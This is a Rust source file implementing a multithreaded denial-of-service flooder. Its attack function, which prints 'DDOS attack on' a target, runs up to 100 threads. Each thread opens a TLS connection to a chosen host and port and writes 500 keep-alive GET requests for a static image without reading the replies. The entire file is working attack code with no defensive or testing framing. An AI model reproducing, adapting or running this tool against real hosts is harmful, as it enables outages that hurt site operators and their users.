use std::io::prelude::*;
use std::net::TcpStream;
use std::io;
use std::sync::{Arc};
use std::sync::Mutex;
use stopwatch::{Stopwatch};
use std::time::Duration;
use std::io::{Error, ErrorKind};
use openssl::ssl::{SslMethod, SslConnector};
use lazy_static::lazy_static;
use threadpool::ThreadPool;
use std::cmp;
use std::str;

const MAX_THREADS:usize = 100;

struct Website {
    pub host:String,
    pub port:u16
}

lazy_static! {
    static ref WEBSITE:std::sync::Arc<std::sync::Mutex<Website>> = Arc::new(Mutex::new(Website {host:String::from(""), port:443}));
}
//Creates a thread for every single request. A pool with limited number of requests would be better, but this works on a small scale
pub fn attack(trials:u16, host:String, port:u16) {
    println!("DDOS attack on {}", host);
    let sw = Stopwatch::start_new();
    let thread_count = cmp::min(MAX_THREADS, trials as usize);
    let pool = ThreadPool::new(thread_count);
    {
        let mut website = WEBSITE.lock().unwrap();
        website.host = host;
        website.port = port;
    }
    for i in 0..trials {
        pool.execute(move || {
            match request_to(i, 500) {
                Ok(i) => println!("Completed: {} requests", i),
                Err(e) => println!("Error: {}", e),
            }

        }); 
    }
    pool.join();
    assert_eq!(0, pool.active_count());
    println!("Execute {} requests in {} ms",trials*500, sw.elapsed_ms());
}

fn _print(id:u16) {
    println!("{}", id)
}

// Connects and sends a get request to cloudfare worker host
fn request_to(request_id:u16,requests:u16) -> Result<u16,io::Error> {
    let host;
    let port;
  
    let website = WEBSITE.lock().unwrap();
    host = website.host.clone();
    port = website.port;
    std::mem::drop(website);
    
    let connector = match SslConnector::builder(SslMethod::tls()){
        Ok(connector) => connector.build(),
        Err(_) => {
            return Ok(0);
        }
    };
    let stream = match TcpStream::connect(format!("{}:{}",host,port)) {
        Ok(stream) => stream,
        Err(e) => {
            return Err(e)
        }
    };
    let mut stream = match connector.connect(&host[..], stream) {
        Ok(stream) => stream,
        Err(_) => {
            return Ok(0);
        }
    };

    // Format HTTP request
    let header = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: Keep-Alive\r\n\r\n", "/static/mybackgrounds/14.jpg".clone(), host.clone());
    let mut total = 0;
    let mut buffer = vec![0 as u8; 4096];

    for id in 0..requests {
        // println!("call {} request {}", request_id, id);
        stream.write(header.as_bytes())?;
        // let bytes_read = match stream.read(&mut buffer) {
        //     Ok(bytes) => bytes,
        //     Err(e) => 0,
        // };
        // println!("{}", bytes_read);
        // if bytes_read > 12 {
        //     let buffer_str = str::from_utf8(&buffer[0..13]).unwrap();
        //     let http_code = buffer_str[9..12].parse::<u16>().unwrap();
        //     println!("{}", http_code)
        // }
        // total += bytes_read
        
    }
    return Ok(requests);
}

